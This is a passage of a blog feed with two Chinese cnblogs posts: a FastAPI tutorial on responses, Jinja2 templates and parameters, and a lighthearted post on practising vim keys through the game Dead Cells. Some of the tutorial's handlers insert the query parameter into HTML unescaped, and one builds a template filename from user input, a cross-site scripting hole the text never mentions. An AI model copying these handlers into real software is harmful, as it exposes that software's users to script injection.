85, 1);\"><strong>文章亮点：</strong>本文将深入解析FastAPI的<code>responses</code>模块，带你掌握JSON、HTML等多种响应格式的返回方法，并详细讲解模板引擎的使用技巧、静态页面的返回与传参实战，以及参数的高效应用。读完本文，你将能轻松构建功能丰富、交互流畅的Web应用。 <br /><br /><strong>📚 目录一览：</strong> <br />- ✨ FastAPI.responses 响应格式全解析 <br />- 🎨 模板引擎（Jinja2）集成与使用 <br />- 🌐 HTML静态页面的返回与参数传递 <br />- 🔧 路径参数、查询参数等高级用法 <br />- 💻 完整代码实战参考</blockquote>\n<h2 style=\"color: rgba(44, 62, 80, 1); padding-bottom: 5px;\">✨ FastAPI.responses 响应格式全解析</h2>\n<p>FastAPI提供了<code>fastapi.responses</code>模块，让你能轻松返回不同格式的响应。默认情况下，FastAPI会自动将返回的字典转换为JSON，但有时你需要更精细的控制。</p>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">核心响应类：</strong></p>\n<div style=\"margin-left: 20px;\">- <code>JSONResponse</code>: 返回JSON数据，最常用。<br />- <code>HTMLResponse</code>: 返回HTML内容，用于渲染页面。<br />- <code>PlainTextResponse</code>: 返回纯文本。<br />- <code>RedirectResponse</code>: 重定向到其他URL。<br />- <code>FileResponse</code>: 返回文件（如图片、PDF）。</div>\n<p>示例：显式返回JSON响应。</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi import FastAPI\nfrom fastapi.responses import JSONResponse\n\napp = FastAPI()\n\n@app.get(\"/data\")\nasync def get_data():\n    return JSONResponse(content={\"message\": \"Hello\", \"status\": \"success\"}, status_code=200)</code></pre>\n<p>通过<code>JSONResponse</code>，你可以自定义状态码和头部信息，比依赖自动转换更灵活。</p>\n<h2 style=\"color: rgba(44, 62, 80, 1); padding-bottom: 5px;\">🎨 模板引擎（Jinja2）集成与使用</h2>\n<p>动态HTML页面离不开模板引擎。FastAPI常用<strong style=\"color: rgba(186, 55, 42, 1);\">Jinja2</strong>来渲染模板，实现数据与视图的分离。</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi import FastAPI, Request\nfrom fastapi.responses import HTMLResponse\nfrom fastapi.templating import Jinja2Templates\n\napp = FastAPI()\ntemplates = Jinja2Templates(directory=\"templates\")  # 模板文件夹\n\n@app.get(\"/user/{name}\", response_class=HTMLResponse)\nasync def read_user(request: Request, name: str):\n    return templates.TemplateResponse(\"user.html\", {\"request\": request, \"username\": name})</code></pre>\n<p>在<code>templates/user.html</code>文件中，你可以使用Jinja2语法：</p>\n<pre class=\"language-html highlighter-hljs\"><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;User Page&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Hello, {{ username }}!&lt;/h1&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n<p>这样，当访问<code>/user/John</code>时，页面会显示\"Hello, John!\"。模板引擎让动态内容生成变得简单。</p>\n<h2 style=\"color: rgba(44, 62, 80, 1); padding-bottom: 5px;\">🌐 HTML静态页面的返回与参数传递</h2>\n<p>除了动态模板，FastAPI也能直接返回静态HTML文件，并通过参数传递数据。</p>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">返回静态HTML文件：</strong>使用<code>FileResponse</code>。</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi.responses import FileResponse\n\n@app.get(\"/static-page\")\nasync def get_static_page():\n    return FileResponse(\"static/index.html\")  # 假设文件在static文件夹</code></pre>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">参数传递到HTML：</strong>结合查询参数或路径参数，动态修改页面内容。</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi.responses import HTMLResponse\n\n@app.get(\"/greet\", response_class=HTMLResponse)\nasync def greet(name: str = \"Guest\"):\n    html_content = f\"\"\"\n    &lt;html&gt;\n        &lt;body&gt;\n            &lt;h1&gt;Welcome, {name}!&lt;/h1&gt;\n        &lt;/body&gt;\n    &lt;/html&gt;\n    \"\"\"\n    return HTMLResponse(content=html_content)</code></pre>\n<p>访问<code>/greet?name=Alice</code>，页面会显示\"Welcome, Alice!\"。这种方式适合简单页面，无需模板引擎。</p>\n<h2 style=\"color: rgba(44, 62, 80, 1); padding-bottom: 5px;\">🔧 路径参数、查询参数等高级用法</h2>\n<p>参数是Web应用的核心。FastAPI支持多种参数类型，让API更强大。</p>\n<div style=\"margin-left: 20px;\">- <strong>路径参数</strong>：通过URL路径传递，如<code>/items/{item_id}</code>。<br />- <strong>查询参数</strong>：通过URL查询字符串传递，如<code>?name=John&amp;age=30</code>。<br />- <strong>请求体参数</strong>：用于POST请求，传递JSON数据。<br />- <strong>依赖注入参数</strong>：重用逻辑，如验证用户。</div>\n<p>示例：混合使用路径和查询参数。</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi import FastAPI, Query\nfrom fastapi.responses import JSONResponse\n\napp = FastAPI()\n\n@app.get(\"/items/{category}\")\nasync def read_items(\n    category: str,\n    limit: int = Query(10, gt=0),  # 查询参数，默认10，必须大于0\n    skip: int = Query(0, ge=0)     # 默认0，必须大于等于0\n):\n    # 模拟数据过滤\n    data = {\"category\": category, \"limit\": limit, \"skip\": skip}\n    return JSONResponse(content=data)</code></pre>\n<p>访问<code>/items/books?limit=5&amp;skip=2</code>，返回JSON数据。FastAPI会自动验证参数，无效时会返回错误响应。</p>\n<h2 style=\"color: rgba(44, 62, 80, 1); padding-bottom: 5px;\">💻 完整代码实战参考</h2>\n<p>下面是一个整合了响应格式、模板引擎和参数使用的完整示例，帮助你快速上手。</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi import FastAPI, Request, Query\nfrom fastapi.responses import JSONResponse, HTMLResponse, FileResponse\nfrom fastapi.templating import Jinja2Templates\nimport os\n\napp = FastAPI()\ntemplates = Jinja2Templates(directory=\"templates\")\n\n# 返回JSON响应\n@app.get(\"/api/data\")\nasync def get_api_data():\n    return JSONResponse(content={\"message\": \"API数据\", \"code\": 200})\n\n# 使用模板引擎渲染HTML\n@app.get(\"/page/{page_name}\", response_class=HTMLResponse)\nasync def render_page(request: Request, page_name: str):\n    return templates.TemplateResponse(f\"{page_name}.html\", {\"request\": request, \"page\": page_name})\n\n# 返回静态HTML文件\n@app.get(\"/static\")\nasync def get_static():\n    file_path = \"static/welcome.html\"\n    if os.path.exists(file_path):\n        return FileResponse(file_path)\n    return JSONResponse(content={\"error\": \"文件未找到\"}, status_code=404)\n\n# 参数使用示例：查询参数传递到HTML\n@app.get(\"/custom-greet\", response_class=HTMLResponse)\nasync def custom_greet(name: str = Query(\"旅行者\", min_length=1)):\n    html = f\"\"\"\n    &lt;html&gt;\n        &lt;head&gt;&lt;title&gt;Greeting&lt;/title&gt;&lt;/head&gt;\n        &lt;body&gt;\n            &lt;h1 style=\"color: blue;\"&gt;你好，{name}！欢迎来到FastAPI世界。&lt;/h1&gt;\n        &lt;/body&gt;\n    &lt;/html&gt;\n    \"\"\"\n    return HTMLResponse(content=html)\n\nif __name__ == \"__main__\":\n    import uvicorn\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)</code></pre>\n<p>确保项目结构如下：</p>\n<div style=\"margin-left: 20px;\">\n<pre class=\"language-bash highlighter-hljs\"><code>- 项目根目录/\n&nbsp;&nbsp;- main.py (以上代码)\n&nbsp;&nbsp;- templates/\n&nbsp;&nbsp;&nbsp;&nbsp;- 例如 index.html, user.html\n&nbsp;&nbsp;- static/\n&nbsp;&nbsp;&nbsp;&nbsp;- welcome.html</code></pre>\n</div>\n<p>运行后，访问不同端点体验功能：<code>/api/data</code>、<code>/page/index</code>、<code>/static</code>、<code>/custom-greet?name=张三</code>。</p>\n<div style=\"text-align: center; margin: 30px 0;\"><hr style=\"border: 0; height: 1px; width: 80%;\" /></div>\n<p style=\"text-align: center; font-style: italic;\">喜欢本文？不要错过✨，点赞👍收藏⭐关注我👆，一起学习更多有用的知识，完善你我的技能树！也请路过的大佬给些建议和指教👉👈🥺！</p>\n</div>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-03 08:34</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ymtianyu\">曲幽</a>&nbsp;\n阅读(<span id=\"post_view_count\">21</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "我为什么用死亡细胞练习 vim",
      "link": "https://www.cnblogs.com/young-tea/p/19433114",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/young-tea/p/19433114\" id=\"cb_post_title_url\" title=\"发布于 2026-01-03 01:04\">\n    <span>我为什么用死亡细胞练习 vim</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>我为什么用死亡细胞练习 vim</p>\n<p>本文主要分析了为什么死亡细胞比别的游戏更适合练习 vim.</p>\n<h1 id=\"首先放一下我的-vimrc\">首先放一下我的 <code>~/.vimrc</code></h1>\n<p>不多, 只有几行, 比较好记.</p>\n<pre><code class=\"language-vimrc\">set noexpandtab\nset nu\nset shiftwidth=8\nset smartindent\nset smarttab\nset tabstop=8\n</code></pre>\n<p>当然这篇网志也是用 vim 写的.</p>\n<h1 id=\"列举一下我玩的游戏\">列举一下我玩的游戏</h1>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: center;\">游戏</th>\n<th style=\"text-align: center;\">维度</th>\n<th style=\"text-align: center;\">激烈程度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: center;\">vim</td>\n<td style=\"text-align: center;\">2d</td>\n<td style=\"text-align: center;\">高???</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">死亡细胞</td>\n<td style=\"text-align: center;\">2d</td>\n<td style=\"text-align: center;\">高</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">俄罗斯方块</td>\n<td style=\"text-align: center;\">2d</td>\n<td style=\"text-align: center;\">低</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">永劫无间</td>\n<td style=\"text-align: center;\">3d</td>\n<td style=\"text-align: center;\">高</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">蛋仔派对</td>\n<td style=\"text-align: center;\">3d</td>\n<td style=\"text-align: center;\">低</td>\n</tr>\n<tr>\n<td style=\"text-align: center;\">英雄联盟</td>\n<td style=\"text-align: center;\">离谱</td>\n<td style=\"text-align: center;\">高</td>\n</tr>\n</tbody>\n</table>\n<p>可以看到, 死亡细胞和 vim 同属 2d 且激烈程度都很高.</p>\n<h1 id=\"维度差异\">维度差异</h1>\n<p>永劫无间和蛋仔派对作为 3d 游戏, 不止要操作角色的移动, 还要操作视角的移动.</p>\n<p>但 vim 作为文本编辑器, 可以认为是 2d 游戏, 只需要操作角色 (光标) 的移动, 视角会自动跟随, 所以在这里是俄罗斯方块和死亡细胞更占优势.</p>\n<h1 id=\"激烈程度\">激烈程度</h1>\n<p>为什么要提到激烈程度呢?</p>\n<p>像蛋仔派对 / 俄罗斯方块这种益智 / 养老游戏, 激烈程度不高, 主要是手眼协调和思维博弈 (真的需要思维博弈吗?), 对于操作的要求并不高. 这和我们激烈的编程是截然相反的.</p>\n<p>还有就是说, 在激烈的游戏里练习, 你会把这个技能慢慢变成你的本能反应, 也就是生物老师所谓的非条件反射, 电竞玩家所谓的肌肉记忆.</p>\n<h1 id=\"如何用死亡细胞练习-vim\">如何用死亡细胞练习 vim</h1>\n<p>首当其冲, 祖传的 <code>h</code> <code>j</code> <code>k</code> <code>l</code> 移动, 我们可以直接把 <code>w</code> <code>a</code> <code>s</code> <code>d</code> 给换成 <code>h</code> <code>j</code> <code>k</code> <code>l</code>.</p>\n<p>但是很显然 <code>h</code> <code>j</code> <code>k</code> <code>l</code> 应该用右手操作, 所以我们应该把攻击换成左手.</p>\n<p>可以想到英雄联盟使用 <code>q</code> <code>w</code> <code>e</code> <code>r</code> 释放技能, 那么我们也可以使用 <code>q</code> <code>w</code> 攻击, 用 <code>e</code> <code>r</code> 调用道具.</p>\n<p>别的 vim 操作当然也很有用, 但并不是简单的游戏就能带给你的, 可以多多查看 vim 文档.</p>\n\n</div>\n<div id=\"MySignature\">\n    原文来自CnBlogs, 作者: <a href=\"https://www.cnblogs.com/young-tea/\" target=\"_blank\">young_tea</a>.\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-03 01:04</span>&nbsp;\n<a href=\"https://www.cnblogs.com/young-tea\">young_tea</a>&nbsp;\n阅读(<span id=\"post_view_count\">79</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}